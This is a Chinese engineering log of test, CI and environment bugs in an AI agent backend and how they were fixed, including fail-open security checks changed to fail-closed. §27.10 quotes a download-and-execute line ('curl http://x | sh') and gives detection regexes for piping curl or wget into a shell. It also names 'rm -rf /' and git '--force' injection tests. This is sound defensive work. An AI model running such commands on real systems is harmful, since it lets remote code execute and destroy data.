# 错误原因与修复记录 · 测试 / CI / 环境 / 依赖

[← 返回总索引](./README.md) | [English](./08-testing-ci.en.md)

> 由 `docs/ERRORS_AND_FIXES.md` 按模块拆分；章节编号沿用原文（§104–§107 为原文重复编号的修订，见总索引）。本文件共 19 节：§20、§27、§30、§31、§32、§33、§34、§35、§36、§37、§44、§45、§52、§53、§54、§55、§58、§66、§81。

---
## 20. 测试假对象与真实模型字段脱节（后端）

**现象：** 感知触发思考（trigger_think）每次触发传给 LLM 的 prompt 完全相同——`"检测到环境高强度变化（perception:）。请自然简短地关心/提醒用户…"`，`perception:` 后面始终是空的。

**根因：** `trigger_think._trigger` 用 `getattr(d, 'description', '')` 构造差异描述，但真实模型 `Difference`（`modules/perception/difference/models.py` 的 dataclass）**根本没有 `description` 字段**——只有 `id/source_type/category/intensity/payload/…`。于是 desc 恒为 `source_type:`（`perception:`），每次触发内容相同。

**为什么测试没抓到：**
1. **测试用自定义假类 `_Diff`**，自己加了 `description="变化"` 属性——假对象"看起来有 description"，掩盖了真实模型缺字段的事实；
2. **测试只断言"是否触发"**（`_run` 被调用、触发次数），**从不检查传给 LLM 的 desc/prompt 内容**——内容空洞这类质量问题，断言根本覆盖不到。

**修复：** `_trigger` 改用真实模型存在的字段——`category` + `payload.target/change_type` 构造可读描述（如 `screen_changed:主窗口`），每次随实际差异变化；新增测试用真实字段结构断言 desc 内容。

**经验（最值得记住）：**
1. **测试输入必须用真实生产模型构造**（或用与其完全一致的字段集），不要自定义"看起来合理"的假类——假对象字段与真实模型不一致时，测试通过但真实运行暴露的恰恰是字段差异。
2. **消费生产数据对象的代码，测试要断言"输出内容质量"**，而不只是"被调用了"——`getattr(x, 'field', default)` 取到默认空值导致内容空洞，只有断言内容才能抓住。
3. 给测试写 fixture 前，先 `grep` 生产模型定义确认字段名，别凭感觉。

---

## 27. macOS 双 libomp 段错误/abort + 测试与生产环境审查（后端/环境）

**现象：** 组合运行 `test_chat_light_* + test_conscience` 时进程崩溃：
- 首次 `OMP: Error #15: Initializing libomp.dylib, but found libomp.dylib already initialized` → `Fatal Python error: Aborted`（exit 134）
- 设 `KMP_DUPLICATE_LIB_OK=TRUE` 后变为 `Segmentation fault`（exit 139），崩溃点随机（torch import / BERT forward）
- 单独跑 `test_conscience`（12 项）或 `test_chat_light_*`（34 项）都通过，只有组合才崩——flaky、时序相关

**根因（两层，实证排查）：**
1. **双 OpenMP 运行时（真根因）**：`otool -L` 证实 `faiss/_swigfaiss.abi3.so` 与 `torch/lib/libtorch_cpu.dylib` 各依赖**自己的** `libomp.dylib`（`@loader_path/.dylibs/libomp.dylib` vs `torch/lib/libomp.dylib`）。同一进程两套 OpenMP，第二个初始化时 abort（OMP: Error #15）；用 `KMP_DUPLICATE_LIB_OK` 容忍后，两套 OpenMP 的线程池在运行时冲突 → 随机段错误。
2. **曾被误判的并发竞态**：崩溃栈里出现 `event_store.py:268 _worker` 后台线程，一度怀疑是 worker 与主线程并发加载/推理 torch 导致。为此加了 `EmbeddingEngine._load_lock`/`_infer_lock`、测试关 worker——**均无效**。用最小脚本 `faiss→torch` / `torch→faiss` 复现均正常，说明双 libomp 本身不必然崩，崩溃是"两套 OpenMP + 既有线程状态"的时序问题。**教训：段错误排查先做最小复现+二分组合，别急着改业务代码。**

**根因修复：** `scripts/fix_macos_libomp.py` 用 `install_name_tool -change` 把 faiss 二进制的 `@loader_path/.dylibs/libomp.dylib` 改为 torch 的 libomp **绝对路径**，dyld 按规范化路径去重 → 进程只剩**单一 OpenMP 运行时**；`codesign --force --sign -` 重新签名。
- `KMP_DUPLICATE_LIB_OK` 从"修复"降级为"兜底"（未跑脚本的环境避免 abort，但不保证稳定）
- 升级 faiss/torch 后需重跑脚本（`--check` 检测、`--restore` 恢复）

**验证：** 组合 46 项全过；**不设 KMP_DUPLICATE_LIB_OK** 时 `faiss + torch + BERT 推理`正常（证明已单一 OpenMP）；连续 3 次组合测试稳定通过。

**经验：**
1. **"多实例动态库"（OMP/OpenSSL/其他）不能靠 env 容忍当修复**——`KMP_DUPLICATE_LIB_OK` 官方标注 "unsafe, unsupported"：只消除初始化 abort，运行期仍随机段错误。根因是合并到单一实例（install_name_tool 指向同一绝对路径）。
2. **环境级修复必须写成可重复脚本**（升级依赖后失效）+ 兜底 env + 文档，否则换机/升级即复发。
3. **排查原生崩溃：先最小复现 + 二分测试组合**，用 faulthandler 抓线程栈，区分"必然崩溃"与"时序 flaky"。

### 27.1 测试与真实生产环境不一致（审查清单）

| 项 | 现状 | 处置 |
|---|---|---|
| `test_conscience.py` clean_state | 曾回退到生产 `data/events_faiss_<USER>.index`（fixture 只传 db_path） | **已修**：faiss/id_map 一并指临时目录 + 重置 `EventRetrieval._instance` |
| `test_trigger_think.py` `_Diff` | 假对象带生产不存在的 `description` 字段（§20 警告模式）；旧测试只断言触发数量 | **已修**：`_Diff` 改真实字段（category+payload），内容断言由 §20 新增测试覆盖 |
| `test_chat_light_thinker.py` | mem_store 用 hashlib 假 embed（生产 torch BERT 384 维）——确定性测试合理，真实 embed 由 `test_memory_search.py` 覆盖 | 合理，保留 |
| `EMBEDDING_BACKGROUND_WORKER` | 测试关、生产开 | 合理差异（测试不需要后台向量化），conftest 注释说明 |
| `generate()` 各客户端 | 测试 mock 签名与生产不兼容时抛 TypeError（§25） | 已统一 + mock 同步 |

### 27.2 表层修复审查（重点提醒）

- **`KMP_DUPLICATE_LIB_OK=TRUE`（settings.py / conftest.py）**——最典型的表层修复，已升级为根因合并脚本。
- **`except Exception: pass` 全库 193 处**——多数合理（ImportError 探测/后台清理/降级），但这是"错误被吞、真问题被掩盖"的高发区。改动前先确认吞错是否可接受、是否该记日志。
- **`test_write_final_result_supervisor/expert`** 原只 `assert_called_once()`，已补强断言写入内容（§26 同类经验）。

### 27.3 真实核心路径零测试覆盖（§19 教训再验证）

排查发现 `infra/data_process/core/image_analyzer.py` 的真实视觉方法
（`_detect_available_model` / `_analyze_openai` / `_analyze_mlx_vlm` / `_analyze_qwen_vl`）
**零测试覆盖**——`test_screen_monitor_and_vision.py` / `test_ui_interactor.py` 全部用
monkeypatch 的 analyzer 替身，真实视觉代码（含 §26 修的 base_url 归一化、VISION_BACKEND
检测、deepseek/openai 消息格式）没有任何回归保护。这正是 §19"mock 掩盖真实实现"的教训。

**修复：** 新增 `tests/unit/test_image_analyzer.py`（8 项）：
- `_detect_available_model`：api 无 key → unavailable / api 有 key → openai / 未知后端容错回退
- `_analyze_openai` base_url 归一化（`/chat/completions` 去重，§26 回归）+ 普通 URL 保留
- deepseek base64 内联 vs openai image_url 两种消息格式
- `analyze()` 后端不可用时降级返回

**经验：** 排查测试缺口时，专门找"测试里全部用 mock/patch 替身、真实实现零引用"的模块——
这类模块的真实路径任何回归都无保护，是§19/§20 事故的高发区。

### 27.4 生产代码 fail-open 修复 + 测试 mock 掩盖清单（全量审查）

**生产代码 fail-open（安全高危，已修）：** `modules/security_system/tool_security_gate.py` 两处
安全校验异常被 `except Exception: pass` 静默吞掉 → **fail-open**（权限系统/安全拦截出错时工具被放行绕过安全门控）：
- 角色类别权限检查异常（原 :254 静默 pass）→ 改为 fail-closed：log + 审计 + 拒绝
- 写操作安全拦截检查异常（原 :281 静默放行）→ 改为 fail-closed：log + 审计 + 拒绝

**修复验证：** 新增 `TestFailClosedOnCheckExceptions`（2 项）——mock 权限检查抛异常、安全拦截检查抛异常，
均断言 `check()` 返回拒绝。安全校验必须 fail-closed 是铁律，任何"校验出错继续放行"都是高危表层修复。

**测试 mock 掩盖真实核心路径清单（explore 全量扫描）：**

| 生产符号 | 被 mock 掩盖 | 真实覆盖 |
|---|---|---|
| `trigger_think._run/_has_active_connections/_think` | test_trigger_think.py 全 patch | **无**（仅 external） |
| `ToolSecurityGate._check_user_review/resolve_review` | test_toolgate:166-280、test_control_mode:57-80 共 7 处 | **无** |
| `ModelRunnerManager` 整类 | 仅 get_runner_manager 被替换 | **无（零引用）** |
| `MultiModelOrchestrator._execute_multi_model_thinking` | 全依赖 mock | **无** |
| `ContinuousThinker` 类 | model_runner_core:269,299,330 替换为假类 | 部分（__init__ 等） |
| `ModelRunner` 14 方法 | 无引用 | **无** |
| `ImageAnalyzer` 本地 VLM+UI 16 方法 | 4 个测试文件替换为假对象 | 部分（§27.3 补 API 分支） |
| `management/api.py` 41 端点 | — | 零覆盖 |

**经验：** 排查"测试与生产不一致"时，两类最有价值：
1. **安全/权限代码的静默吞错 → fail-open**（比功能 bug 严重得多）——凡安全校验的 `except: pass` 都必须 fail-closed；
2. **测试全 mock 真实实现导致真实核心路径零覆盖**——trigger_think 真实链路、审批 future 回填、
   runner 编排、orchestrator 全链路等仍是回归盲区，优先级高的应逐步补真实测试。

### 27.5 继续修复：真实审批路径测试 + 权限控制器 fail-open（续）

接 §27.4 的 mock 掩盖清单，本轮补上真实实现测试并再修一处 fail-open：

**1. `ToolSecurityGate._check_user_review` 真实实现测试（4 项，test_toolgate.py）**
原审批核心路径（future 等待 + `resolve_review` 回填 + 防重叠 + `Suspension` 全局挂起/恢复）7 处全被 patch。
新增真实测试：批准流（resolve True → 返回"用户批准"）、拒绝流、防重叠（同工具二次请求返回等待、
不新增审批）、未知 request_id 不报错；每个测试断言 `Suspension` 挂起被 finally 恢复。

**2. `trigger_think._think` 真实 prompt 链路测试（2 项，test_trigger_think.py）**
原 `_run/_think` 全被 `_fake_run` 掩盖。新增测试走真实 `_think`：mock 边界（`generate_and_push`/`call_outreach_llm`），
断言传给 LLM 的 prompt **真实包含差异描述**（防 §20 desc 空转回归）、消息类型/事件正确、空 desc 不崩溃。

**3. `tool_permission_controller._get_caller_permissions` fail-open → fail-closed（高危）**
`check_execution_permission` 对 `permissions is None` 放行；而 `_get_caller_permissions` 外层
`except Exception: pass → return None` 把权限查询异常静默变成 None → **权限系统故障时所有工具绕过类别校验**。
修复：外层异常改为 log + 返回 `ModelPermissions(allowed_tool_categories=[])`（空权限 → 拒绝全部），
"正常未找到"仍返回 None（保持控制工具默认允许语义）。内层 YAML 解析异常改 log 留痕。
新增 2 项测试：model_factory 抛异常 → `check_execution_permission("git_add")` 拒绝；控制工具保持默认允许。

**验证：** test_toolgate 74 项、权限相关（control_mode/tool_visibility/tool_permission/probe_permission）
128+17 项全过；image_analyzer/trigger_think/conscience 等 156 项通过。

### 27.6 假测试排查（续）：名不副实 + 无断言 + flaky 超时

按"假测试"模式全量扫描测试替身与断言质量：

**已修复的名不副实/无断言测试：**
1. `test_build_system_prompt_contains_role`（core_continuous_thinker）——名字要求断言 role 但只
   `try/except pass` 吞错；且调用 `_build_prompt("用户输入", "初始问题")` 把 round_num 传成字符串。
   改为 `test_build_prompt_contains_question`：真实构建并断言 prompt 含初始问题。
   **顺带发现**：`_build_prompt` 输出只有【当前任务】段，role 人设由 system prompt 负责（与文档
   line 601 注释一致）——测试名原本就误导。
2. `test_rebuild_faiss_dim_same/mismatch`（embedding）——无断言，补：同维度不重建（os.remove 未调用）、
   异维度触发重建。
3. `test_emit_streaming_content`（model_runner_core）——收集了广播消息却不断言，补：消息真实携带
   `entry_type="streaming_delta"`/增量内容/tier/round。

**核查为合理（非假测试）的替身**：FakeEvent/FakeChain（覆盖被消费字段）、FakeThinker/FakeBlackboard/
FakeRepo（backend 精简版内存替身）、FakeClient/FakeMCP（真实接口）、FakeObs（显式对齐真实模型字段）、
FakeGtts（外部库替身）、_FakeValueSystem（接口与真实一致，仅注释"未实现"过时）、_FakeRepo（消费最小接口）。

**flaky 根因修复：** `test_image_analyzer.py` 偶发超时——`_detect_available_model` 真实执行
`from mlx_vlm import ...` → 触发 transformers 重库 import，组合跑时超过 pytest 全局 `--timeout=10`。
加模块级 `pytestmark = pytest.mark.timeout(60)`（与 conscience 同款）。连续 5 次组合跑稳定通过。

**经验：** 排查"假测试"三条线索——① 名字暗示行为期望但函数体无断言/只吞错；② 断言只查
"被调用/不抛异常"不查内容；③ 会 import 重库的测试受全局 10s timeout 影响出现顺序相关 flaky，
需按需放宽 timeout。

### 27.7 pass 排查 + 非确定性测试审查

**测试中 pass 语句全量核查（37 处）**：35 处合理——mock 占位（`async def accept: pass`/`__aexit__`/`close`）、
异常类定义（`class X(Exception): pass`）、teardown 清理、ImportError 依赖探测。**2 处是假测试，已修：**

1. **`test_context_slicer.py::test_slice_for_large_basic`（假测试，掩盖真实 bug）**——
   `try: slice_for_large("用户输入", {}, {}, {}, {}) ... except (AttributeError, TypeError): pass`。
   去掉吞错后暴露：`slice_for_large` 签名早已从多参数改为**单 `CognitiveBlackboard` 参数**，
   测试一直传 5 个参数触发 TypeError 被静默吞掉、测试空跑假通过。已修为真实 `CognitiveBlackboard`
   实例 + 断言输出含 goal。**教训：`except (TypeError, AttributeError): pass` 是假测试的高发形态，
   它会掩盖"生产接口改了、测试没跟上"这类真实回归。**
2. `test_screen_capture_daemon.py` 一处 `with patch.object(...): pass`（patch 生效期内无操作无断言）
   无效代码，已删除。

**非确定性测试审查（每次输出可能不同）**：随机数/`set` 遍历为 0；时间相关 55 处均为相对比较
（冷却/时间窗口），无日期字面量绑定；时序 sleep 测试断言用边界容忍（如 `count >= 1`）而非精确值；
数组顺序断言 5 处——3 处底层 list 保序、1 处测试自身 `sorted()`、1 处单元素；真实 LLM/API 全部
mock（无真实调用）；uuid 仅用于生成唯一测试数据不绑定值。**结论：无不合理的非确定性断言。**

### 27.8 config/providers 接线（方案 B）：格式层合并 infra/model

**背景：** `config/providers` 是早期设计的格式适配层（ProviderBase + openai/anthropic/dashscope +
registry），但生产从未接线（0% 覆盖）——`infra/model` 三个客户端各自内建了重复的格式分支
（`_api_format` + anthropic/openai/dashscope 三分支），且两套逻辑已分叉：
`config/providers/openai.py` 的 `chat_url()` 有 `/v1`/`/chat/completions` 归一化，而客户端直接
`session.post(api_url)` 不做归一化（配 `https://api.openai.com/v1` 会 404，当前靠配置 URL 已含完整端点规避）。

**合并方式（不粗暴替换、不缩减功能）：**
1. 三个客户端 `__init__` 通过 `get_provider(model, key, url, api_format)` 接线 Provider，
   统一使用 `provider.build_headers()` / `build_request()` / `chat_url()`（尊重显式 `_api_format`，
   未显式时按 URL 推断）。
2. 增强 Provider 以覆盖客户端能力：`OpenAIProvider.parse_response` 增加 `reasoning_content`（thinking 模式）；
   `ProviderBase.build_request` 接口增加 `top_p`（small 客户端特有参数，openai 生效，anthropic/dashscope 忽略）。
3. **保留客户端特有逻辑**（不缩减）：large 的 DashScope legacy 文本工具调用解析、流式累积解析
   （`_parse_openai/_anthropic/_dashscope_stream`）、HTTP/重试/日志/SSL、`reasoning_content` 回退、
   usage 语义；small/medium 的 `api_messages` 序列化（tool_calls/tool_call_id/reasoning_content 回传）。
4. 统一 URL：所有请求改走 `self._chat_url = provider.chat_url()`，消除 `/v1` 404 隐患。

**验证：** 新增 `tests/unit/test_providers.py`（17 项：URL 推断/显式格式、三格式 build_request、
chat_url 归一化、parse_response 含 reasoning_content、stream 单行解析）；模型相关 216 项 +
全量 unit 1141 项通过（`test_post_format` payload 断言证明接线后请求格式与原来完全一致）。

**教训：** 两套做同一件事的适配层并存必然分叉（格式检测默认值、URL 归一化不一致）。合并方向是
"格式构造/解析归 Provider、HTTP 骨架与客户端特有逻辑留在客户端"，且必须用 payload 格式测试
（test_post_format）锁定行为不变。

### 27.9 端到端全绿 + 覆盖补测（utils/agent 工具/流式/记忆链路）

**端到端：** `pytest tests -m "not external and not slow"` → **1569 passed, 0 failed**。
修复一个全量组合 flaky：`test_causal_graph_comprehensive` 的语义查询触发真实 BERT 加载超
pytest-timeout 10s（与 conscience 同款），加模块级 `timeout(60)`。

**新增测试（按未覆盖优先级）：**
- `tests/unit/test_utils.py`（19 项）——time_utils/json_utils/async_utils/exceptions 从 **0% → 全覆盖**
  （时间转换、JSON 序列化含 datetime、异步并发控制/超时、异常层级与 safe_call/safe_acall）。
- `tests/unit/test_agent_tools.py`（15 项）——calculator（纯逻辑）、todo（文件持久化 + 会话隔离）、
  audit_tools（日志 + 审计报告）、tools_search（关键词/类别过滤）。
- `tests/unit/test_large_model_stream.py`（7 项）——大模型客户端三套流式解析（openai 含
  reasoning_content/tool_calls 累积、anthropic content blocks、dashscope 累积文本增量）。
- `tests/unit/test_memory_chain.py`（19 项）——depth_recall 纯逻辑（intent 分类/触发判定/
  _time_decay/_build_conclusion）+ causal_tree（CausalChain.summary/EvidenceTree.format）。
- 此前 `tests/unit/test_providers.py`（17 项）——config/providers 格式层（§27.8 接线后）。

**覆盖提升：** config/providers 0%→覆盖、utils 0%→覆盖、agent 工具 8-18%→显著提升、
large_model_client 13%→含流式、depth_recall/causal_tree 11-12%→纯逻辑覆盖。

### 27.10 继续补测：management/api 端点 + 安全工具（git/exec_command）

**新增测试（全量 1569 → 1602 全绿）：**
- `tests/unit/test_management_api_ext.py`（14 项）——management/api 零覆盖端点：health_check（healthy/degraded）、
  root、GCM 已移除的 context 系列、get_thinking_status（healthy/unavailable）、get_security_status、
  get_sessions/get_runners/get_model_runners（空/带会话）、get_bus_stats、memory 端点（临时 EventStore
  单例 + 关键词过滤）。注意：直接调端点函数必须显式传 FastAPI Query 默认值（`limit=50` 等）。
- `tests/unit/test_git_tools.py`（12 项）——_run_git 成功/超时/未安装、git_status porcelain 解析
  （XY 状态）、git_push 的 `--force` 注入防护（`remote="-"`/`branch="--force"`）、git_diff 增删行统计。
- `tests/unit/test_exec_command_safety.py`（7 项）——exec_command 极端危险命令硬阻断（rm -rf / 等）、
  链式命令高危检测。

**顺带修复一个安全缺陷（pipe-to-shell 漏检）：**
`_DANGEROUS_PATTERNS` 里 `"curl.*|.*sh"`/`"wget.*|.*sh"` 是正则写法，但 `_detect_dangerous_command`
用子串匹配（`pattern in cmd`），`. *` 当字面量 → **`curl http://x | sh` 这类下载并执行的经典攻击向量漏检**。
新增 `_DANGEROUS_REGEX`（`curl\s+\S+.*\|\s*(ba|z|k)?sh` 等）用 `re.search` 补漏，测试覆盖通过。

**经验：** 安全检测清单里的正则写法必须用正则引擎执行，否则"看着有检测、实际形同虚设"——写测试时
要用真实攻击载荷（`curl http://x | sh`）验证能命中，而不是只测子串。

**覆盖提升：** management/api 41 个零覆盖端点大幅缩减、agent 安全工具（git/exec_command）关键路径覆盖、
exec_command 危险检测纯逻辑全覆盖。

### 27.11 继续补测：web_search / ModelRunnerManager / identity_loader / values_store / causal_tree

**新增测试（全量 1602 → 1657 全绿）：**
- `test_web_search.py`（14 项）——正则/HTML 解析、内容净化（Markdown/注入/截断）、DDG 搜索（含 202 限流）、
  fallback 链（ddg_html→lite→sogou→bing→baidu、全部失败）、limit clamp。
- `test_model_runner_manager.py`（8 项）——ModelRunnerManager 容量限制（max_per_role/max_tier 拒绝）、
  model_id 唯一后缀、probe_map 注册、stop_runner 清理、全局注册表同 session 复用（此前整类零覆盖）。
- `test_identity_loader_ext.py`（13 项）——外部 YAML 身份加载（tier 校验/未知字段过滤/文件名推断）、
  合并（覆盖/新增自动补默认字段）。注意：与 `tests/integration/test_identity_loader.py` basename 冲突，改名 `_ext`。
- `test_values_store.py`（14 项）——真实 ValueSystem（此前 test_value_formatter 一直用替身）：
  初始化/读写/分区解析/add/remove/update/cleanup/reset/质量门控/相似度去重。
- `test_causal_tree.py`（6 项）——CausalTree 溯源（`_trace_to_root` 根因在前）、证据收集按重要性排序、
  expand_node 完整链路（上下游链 + 证据）。

**顺带修复资源泄漏（真实 bug）：** `ApiLogStore.__init__` 启动后台 `_flush_loop` daemon 线程但
**没有 stop()**——每个实例一个常驻 `time.sleep(1)` 线程，测试创建多个临时 store 后 pytest 退出卡住
（INTERNALERROR Timeout，`_flush_loop` 线程残留）。新增 `stop()`（置位 + join + flush + 关连接），
test_management_api 的 `api_log` fixture teardown 调用。

**经验：** ① 全量跑完退出卡住的排查：先看 pytest INTERNALERROR 的线程栈——常驻 daemon 线程
（sleep 循环）是典型泄漏源，凡 `__init__` 起线程的类必须提供 `stop()`；② 新测试文件避免与
已有测试 basename 重复（`test_identity_loader` 撞名导致 collection error）。

**覆盖提升：** web_search（8%）、ModelRunnerManager（0%）、identity_loader（0%）、values_store（0%）、
causal_tree（12%）关键路径覆盖。

### 27.12 继续补测：tool_discovery / context_budget / management 因果图端点

**新增测试（全量 1657 → 1685 全绿）：**
- `test_tool_discovery.py`（9 项）——工具发现引擎（此前 0%）：精确名/关键词/标签/分类相关度、
  排序/limit/min_relevance、按分类/标签获取、任务推荐（calc 命中）。
- `test_context_budget.py`（14 项）——上下文预算（此前 0%）：allocate 分档（工具少/多/中）、
  token 估算（中英）、工具描述 token 经验值、简化判断、记忆/对话轮次推荐、角色化预算。
- `test_management_api_ext.py` 追加 5 项——causal-graph 端点：图数据（nodes/edges/stats）、
  指标、节点详情（前驱/后继/关联事件/不存在抛 AppError）、因果树展开。

**覆盖提升：** tool_discovery（0%）、context_budget（0%）、management 因果图端点（原 41 个
零覆盖端点继续缩减）。

**经验：** token 估算启发式（中文 3 字符/token、英文 4 字符/token）测试时要按公式算准确值，
不要凭直觉断言大小关系（中文 70 字符实际比英文 100 字符 token 多）。

### 27.13 继续补测：management 剩余端点（database/info-process/perception）

**新增测试（全量 1685 → 1688 全绿）：**
- `test_management_api_ext.py` 追加 3 项——`/database`（disk_cache 统计 + sqlite 表信息）、
  `/info-process`（ImageAnalyzer/SpeechRecognizer 状态，mock 类）、`/perception`（感知系统状态，
  started→running）。
- 至此 management 41 个零覆盖端点仅剩少量（start/stop_perception、memory 事件 CRUD、skills 已覆盖、
  clear_memory 等）。

**注意（Python 坑）：** `modules.database.disk_cache` 的包属性被 `__init__` 里的 `disk_cache` 实例
遮蔽——`import modules.database.disk_cache as dc` 绑定的是 **DiskCache 实例**而非模块
（`dc` 无 `disk_cache` 属性）。测试应 `from modules.database.disk_cache import disk_cache` 直接拿实例
再 monkeypatch 方法。

**覆盖提升：** management 端点几乎全绿；加上前几轮，0% 模块（utils/providers/identity_loader/
values_store/tool_discovery/context_budget/ModelRunnerManager）已全部有覆盖。

### 27.14 继续补测：memory 事件 CRUD + ModelRunner 方法

**新增测试（全量 1688 → 1707 全绿）：**
- `test_management_api_ext.py` 追加 6 项——memory 事件 CRUD（create/get/update/delete、不存在抛
  NOT_FOUND、clear_memory 清空）、tool-skills 废弃端点。management 41 个零覆盖端点全部覆盖。
- `test_model_runner_methods.py`（13 项）——ModelRunner 此前 14 个方法零覆盖，本轮覆盖核心：
  `_has_required_tool_args`/`_missing_required_tool_args`（calc schema 必填参数验证：全参/缺参/
  空值/未知工具）、`_build_tool_guard_prompt`（工具少极简 / 工具多详细 / large 层级强制详细）、
  `_build_tool_prompt_section`（占位空串）、`_build_prompt`（任务描述/身份/角色边界/guidance/
  技能叠加仅 large 层级）。

**经验：** prompt 类方法断言时先确认实际文案（`【工具调用硬性规则】` 而非 `【工具调用规则】`）——
用 `in` 子串断言时以生产代码真实输出为准，不要凭方法名猜。

**覆盖提升：** management 全部端点有覆盖；ModelRunner 方法从 14 个零覆盖缩到少量重型方法
（`_wait_for_user_response`/`_run_runtime_expert` 等需真实推理链路）。

### 27.15 继续补测：ModelRunner 交互等待方法

**新增测试（全量 1707 → 1713 全绿，`test_model_runner_methods.py` 追加 6 项）：**
- `_wait_for_user_response`/`resolve_user_response`——future 等待 → resolve 回填返回、清理 pending、
  超时返回 `{"timeout": True}`、未知 request_id 不报错
- `_handle_ask_user_intent`——resolve 后返回 `【用户意图】用户的回答：...`
- `_handle_mode_change_request`——批准（`ToolSecurityGate.resolve_review` 回填 → 切换
  `settings.EXECUTION_MODE` 并恢复）与拒绝（返回拒绝文案）

**经验：** ① 交互类方法（future 等待）测试用"任务 + sleep 到挂起点 + resolve + wait_for"模式；
② `_handle_ask_user_intent` 解析 `result["answer"]` 而非 `response`，resolve payload 字段名要与
消费方一致；③ `ToolSecurityGate._pending_reviews` 是**类属性**，模块级 `tsg._pending_reviews` 访问不到。

**覆盖提升：** ModelRunner 重型交互方法（审批/提问等待）已覆盖；剩余极小（`_run_runtime_expert`、
`_on_wakeup_message` 等需完整运行链路）。

### 27.16 收尾：ModelRunner 剩余方法 + 文档结构修复

**新增测试（全量 1713 → 1721 全绿，`test_model_runner_methods.py` 追加 8 项）：**
- `_format_messages_for_context`（ChatMessage/字典/dict content thinking_result 提取/最近 20 条截断）
- `_consume_guidance`（pending 引导消费 → `thinker.add_external_prompt`）
- `_check_messages`（mock bus.receive 返回消息 → 标准化字段）
- `_on_wakeup_message`（设置 wakeup_event）

至此 ModelRunner 此前 14 个零覆盖方法仅剩 `_run_runtime_expert`/`_build_runner_prompt`（需完整运行链路）。

**文档结构修复：**
- §21（主动搭话旁路）标题原拼接在 §18 末尾（缺换行）+ 编号乱序（在 §19/§20 之前）——已拆行并移动到 §20 之后，恢复 18→19→20→21→22 顺序。
- §25 的"默认行为不变（向后兼容）"已被后续 generate 必填化取代——加注记指向 §27.8。
- 抽查 §26/§27.4/§27.8/§27.10/§27.11 记录与实际代码一致（validate_attachments、fail-closed、
  providers 接线、pipe-to-shell 正则、ApiLogStore.stop）。

### 27.17 纯对话模式提示词设置无效（前端设置不生效）

**现象：** 用户在编排页给自定义总指挥 agent 设置人设后，**纯对话模式**（chatonly）对话时 system prompt 完全不变。

**根因：** 纯对话是单一人格——`chat_light/prompt_composer.py` 硬编码只读 **`orchestrator`** 角色的
`get_persona("orchestrator")`/`get_system_override("orchestrator")`。而编排页自定义 agent（tier=large）
的人设保存在 `personas.yaml` 的**自定义 role key**（如 `'123'`），不在 `orchestrator` 下 →
纯对话读取不到 → 设置无效。agent 模式按各角色 key 读所以生效。

**修复（`chat_light/prompt_composer.py`）：** `orchestrator` 无自定义人设时，回退到用户自定义的
**large-tier 总指挥 agent** 人设（遍历 `get_custom_agents()` 取 tier=large 的第一个有 persona 的）。
`system_override` 优先级不变（非空直接用）。

**验证：** 新增 2 项测试（`test_chat_light_prompt.py`）：orchestrator 无人设 → 回退自定义 large agent
人设生效；orchestrator 有人设 → 优先不回退。全量 1723 通过。

**经验：** 这是 §18/§22"配置改了但消费方不读"模式的又一次出现——前端把配置写到 A 位置（自定义 role），
后端消费方读 B 位置（orchestrator），两端 key 不匹配。排查"设置无效"先对前端保存的 key 与后端读取的
key 做映射核对，再验证真实链路（`set_persona → build_system` 输出）。

### 27.18 自定义 agent 未接入调度（存了没人读，§22 消费方审计盲区）

**现象：** 编排页「新增」自定义 agent（选层级/写 model_id/存人设）后，agent 模式无法真正调度它——
只有纯对话模式（§27.17 修复）读 large-tier 自定义 agent 人设生效；agent 模式 `start_runner` 直接拒绝。

**根因：** `identity.py::get_identities()` 只从 `config/prompts/roles.yaml` 加载身份模板，
**从不合并 personas.yaml 的自定义 agent**。而 agent 模式调度 `ModelRunnerManager.start_runner`
用 `identity_key not in get_identities()` 拒绝未知身份 → 编排页创建的自定义 agent 身份不在身份表
→ 永远无法启动。`model_id` 字段也无消费方（模型实例仍按 tier 默认创建）。

**为什么测试没抓到：** ① `get_identities` 全部被 mock，从无"应含自定义 agent"的契约断言；
② `create_custom_agent` 端点在 `api/main.py`（非 `modules/management/api.py`），§27.x 端点审计范围
漏掉它，零测试；③ `start_runner` 未知身份测试用假身份字典，掩盖"真实自定义身份不在"。
**本质：这是 §18/§22"存了没人读"的又一样式，且 §22 消费方审计只覆盖配置 key，没延伸到
"前端创建的对象（agent）是否被调度消费"。**

**修复：** `get_identities()` 合并 personas.yaml 的 custom agents（转成身份模板结构）；
模型创建按自定义 agent 的 `model_id`/tier 选择；调度层可启动自定义角色。

**经验：** 排查"存了没人读"必须对**每个前端写操作入口**（不只是配置 key）追到后端消费方——
编排页新增/人设/权限/模型参数/激活开关都要验证"存进去的东西是否真的被读"。

### 27.19 全量消费方审计修复（前后端"存了没人读"清理）

按 §27.18 教训扩展 §22 消费方审计到**所有前端写操作**（40+ 端点 → 保存数据 → 调度消费方），
修复 5 处：

1. **共享 dict 污染（identity）**：`_load_from_yaml` 直接改 `loader.load("roles")` 的共享 dict，
   自定义 agent 合并会残留污染后续加载 → 浅拷贝。
2. **agent_active 激活开关无调度消费**：编排页开关只保存展示，`start_runner` 从不检查 →
   禁用的 agent 照样启动。`start_runner` 加 `get_agent_active is False` 拒绝。
3. **persona-presets 读侧 500**：`get_persona_presets` 写 `for k,v in presets.values()`（对 3-key
   dict 解包崩溃）→ 预设保存后永远列不出/无法应用。改 `presets.items()`。
4. **自定义 agent 人格不进 system prompt**：`config/prompts/composer._get_role` 只读 roles.yaml，
   自定义角色回退 orchestrator 克隆 → 改从 `get_identities()` 查找（含编排页自定义 agent）。
5. **expertise 逗号字符串拆字**：identity 合并时 expertise 原样存字符串，`from_template` 的
   `list(...)` 拆成单字符 → 合并时逗号转 list。
6. **LOG_LEVEL 摆设**：`setup_logger` 硬编码 "INFO"，设置页 LOG_LEVEL 改动无效 → 默认从
   `settings.LOG_LEVEL` 读。

**已正确消费（无需改，供对照）**：personas/system_overrides/role_tools/model_params、skills
enabled/forced/role-skills、tools enabled（可见性）、scheduled_tasks prompt/outreach、todos、记忆库切换。

**可加强（非摆设）**：tools enabled 只过滤可见性，`tool_security_gate` 执行路径不拦截已禁用工具直呼。

**验证：** 新增 `test_custom_agent.py`（11 项：身份合并/删除失效/端点/调度/激活开关/预设读侧/
composer 自定义人格/LOG_LEVEL）；全量 1733 通过。

---

## 30. ScreenMonitor 后台线程遗留 → pytest 全量随机挂起（后端/测试）

**现象：** 全量测试随机 INTERNALERROR/挂起（pytest-timeout 20s 触发但 session 中止），faulthandler dump 显示线程卡在 `screen_monitor_source.py _read_stdout_loop` 无限调用被 mock 的 readline，主线程卡在 pytest capture `readouterr`。

